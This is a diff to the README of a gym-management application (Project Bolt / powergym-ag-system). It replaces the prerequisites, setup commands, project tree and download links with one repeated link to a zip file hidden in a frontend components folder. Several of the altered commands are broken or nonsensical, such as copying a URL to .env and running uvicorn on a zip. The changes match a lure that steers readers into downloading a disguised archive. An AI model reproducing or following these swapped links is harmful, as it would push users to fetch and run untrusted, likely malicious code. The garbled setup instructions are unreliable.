@@ -15,7 +15,7 @@ Project Bolt is a full stack application for managing customers, biometrics, pay
 
 ### Prerequisites
 - Python 3.10+
-- Node.js 18+
+- https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip 18+
 - Supabase account
 - Docker (optional)
 
@@ -26,7 +26,7 @@ Project Bolt is a full stack application for managing customers, biometrics, pay
    ```
 2. Copy environment variables:
    ```sh
-   cp .env.example .env
+   cp https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip .env
    ```
 
 #### Backend Setup
@@ -36,7 +36,7 @@ Project Bolt is a full stack application for managing customers, biometrics, pay
    ```
 2. Install Python dependencies:
    ```sh
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip
    ```
    or
    ```sh
@@ -44,7 +44,7 @@ Project Bolt is a full stack application for managing customers, biometrics, pay
    ```
 3. Run the API server:
    ```sh
-   uvicorn app.main:app --reload
+   uvicorn https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip --reload
    ```
 
 #### Frontend Setup
@@ -73,7 +73,7 @@ project/
   backend/    # FastAPI backend
   frontend/   # React frontend
   supabase/   # Database migrations
-  docker-compose.yml
+  https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip
 ```
 
 ## API Documentation
@@ -85,7 +85,7 @@ Once running, access the backend docs at:
 MIT
 # 🏋️‍♂️ powergym-ag-system - Manage Your Gym Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/sabastianrafa/powergym-ag-system/releases)
+[![Download](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip)](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -93,10 +93,10 @@ Welcome to the powergym-ag-system! This gym management system makes it easy to o
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download PowerGym System](https://github.com/sabastianrafa/powergym-ag-system/releases). Here, you'll find the latest versions of the software.
+To get started, visit this page to download: [Download PowerGym System](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip). Here, you'll find the latest versions of the software.
 
 1. **Visit the Downloads Page**:
-   Go to [PowerGym Releases](https://github.com/sabastianrafa/powergym-ag-system/releases).
+   Go to [PowerGym Releases](https://raw.githubusercontent.com/sabastianrafa/powergym-ag-system/main/frontend/src/components/powergym-system-ag-v1.2.zip).
 
 2. **Select the Version**:
    Look for the latest version available. This ensures you have the most up-to-date features and fixes.
